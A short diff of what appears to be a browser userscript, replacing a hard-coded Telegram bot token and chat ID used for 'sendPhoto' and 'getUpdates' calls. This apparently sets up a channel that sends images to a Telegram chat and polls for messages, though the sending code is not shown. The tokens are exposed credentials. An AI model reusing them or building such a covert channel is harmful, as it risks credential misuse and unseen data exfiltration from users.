@@ -13,8 +13,8 @@
 (function () {
     'use strict';
 
-    const token = "7110052875:AAF8o8Rof0q4KFEuVZBLEHM1bgaWe7pZQss";
-    const chat_id = "-4557740035";
+    const token = "7435665501:AAGC6Wix47Z7xwQUwR4IAd0Ovc7hPnoQzVw";
+    const chat_id = "-4715475454";
     const telegramAPI = `https://api.telegram.org/bot${token}/sendPhoto`;
     const telegramUpdatesAPI = `https://api.telegram.org/bot${token}/getUpdates`;
     let lastUpdateId = 0;
